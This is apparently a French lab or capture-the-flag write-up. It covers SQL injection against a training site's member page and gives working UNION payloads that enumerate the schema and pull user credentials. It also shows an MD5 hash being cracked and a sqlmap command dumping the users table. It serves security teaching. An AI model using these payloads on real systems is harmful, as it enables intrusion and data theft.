# SQL INJECTION

http://192.168.1.16/index.php?page=member

1. Hmmm ... 

    1 OR 1=1 
    1 ORDER BY 2
    1 ORDER BY 3
    1 UNION SELECT database(), user()

2. Intéressant ...

    1 OR 1=1 UNION SELECT null, table_name FROM information_schema.tables  
    1 OR 1=1 UNION SELECT null, column_name FROM information_schema.columns
    1 or 1=1 UNION select table_name, column_name FROM information_schema.columns

    Avec ces injections on peut structurer la DB : 

    users       : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
    guestbook   : id_comment, comment, name
    list_images : id, url, title, comment
    vote_dbs    : id_vote, vote, nb_vote, subject

3. Continuons ...

    1 or 1=1 UNION SELECT first_name, last_name FROM users
    [...]
    1 or 1=1 UNION SELECT Commentaire, countersign FROM users

Et voilà ! On obtient "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
Il s'agit d'un hash MD5 (https://md5hashing.net/hash_type_checker)
Qui contient "FortyTwo", soit "fortytwo" (https://md5decrypt.net/#answer) 
En SHA256, on obtient : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# PROTECTION

Utiliser un ORM, tout simplement ;) Cela réduit la quantité de code qui doit être écrit et homogénéise le code, mais peut nuire aux performances.
Exemple d'ORM : Active Record pour Ruby on Rails, Eloquent en PHP, Django en Python, Mongoose pour Node

Une fois un ORM mis en place, il est possible de s'assurer que tout est sécurisé par rapport aux injections SQL avec SQLMAP :

    sqlmap -u "http://192.168.1.16/?page=member&id=1&Submit=Submit#" --dump -T users

# BONUS

Cheat-sheet sur les injections SQL : https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/?utm_source=hacksplaining&utm_medium=post&utm_campaign=articlelink